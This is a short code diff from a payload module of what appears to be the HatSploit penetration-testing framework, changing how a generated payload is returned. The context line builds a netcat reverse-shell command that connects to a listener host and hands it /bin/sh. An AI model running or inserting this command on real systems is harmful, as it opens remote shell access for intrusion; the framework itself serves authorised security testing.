@@ -70,5 +70,4 @@ class HatSploitPayload(Payload, TCPClient):
         self.output_process("Generating payload...")
         payload = f"nc {local_host} {local_port} -e /bin/sh"
 
-        self.payload = payload
-        self.instructions = payload
+        return payload
